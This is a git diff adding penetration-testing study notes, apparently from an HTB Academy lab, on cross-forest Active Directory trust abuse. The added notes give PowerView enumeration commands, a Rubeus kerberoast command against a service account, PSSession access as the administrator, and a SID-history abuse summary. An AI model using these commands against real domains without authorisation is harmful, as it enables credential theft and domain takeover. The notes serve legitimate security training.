@@ -3101,3 +3101,60 @@ PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
 - **Understand the Manual Process**: Always understand the manual process of gathering required data points.
 - **Use Automation Tools with Caution**: Be cautious when using automation tools in a client production environment to avoid unexpected issues.
 - **Avoid Blindly Using "Autopwn" Scripts**: Work with tools you fully understand to maintain control over the process.
+
+---
+# Attacking Domain Trusts - Cross-Forest Trust Abuse
+
+## Cross-Forest Kerberoasting
+Kerberos attacks such as Kerberoasting and ASREPRoasting can be performed across trusts depending on trust direction. If positioned in a domain with an inbound or bidirectional domain/forest trust:
+- Obtain a Kerberos ticket and crack a hash for an administrative user in another domain with Domain/Enterprise Admin privileges in both domains.
+- Use **PowerView** to enumerate accounts with SPNs.
+
+### Enumerate Accounts for SPNs
+```powershell
+Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
+```
+- Target account: `mssqlsvc`
+- Member of Domain Admins group
+
+### Perform Kerberoasting with Rubeus
+```powershell
+.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+```
+- Extract and crack the hash offline.
+
+## Admin Password Re-Use & Group Membership
+- Check for password reuse across two forests with a bidirectional forest trust.
+- **PowerView** to enumerate foreign group membership.
+
+### Using Get-DomainForeignGroupMember
+```powershell
+Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
+```
+
+### Verify Access Using Enter-PSSession
+```powershell
+Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
+```
+
+## SID History Abuse - Cross Forest
+- If SID Filtering is not enabled, add a SID from one forest to a user's token when authenticating across the trust.
+- This means if a user is migrated from forest A to forest B then SID history will retain SID A and then can still have priveledges in A with being in forest B
+
+## Example of Kerberos Attack
+```powershell
+Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof
+
+Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
+
+Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
+```
+
+## Attack Summary
+1. **Enumerate SPNs** in the target domain.
+2. **Kerberoast** using Rubeus.
+3. **Password Reuse Check** across trusted domains.
+4. **Foreign Group Membership** enumeration.
+5. **Access Verification** using WinRM.
+6. **SID History Abuse** across forest trust (if SID Filtering is not enabled).
+
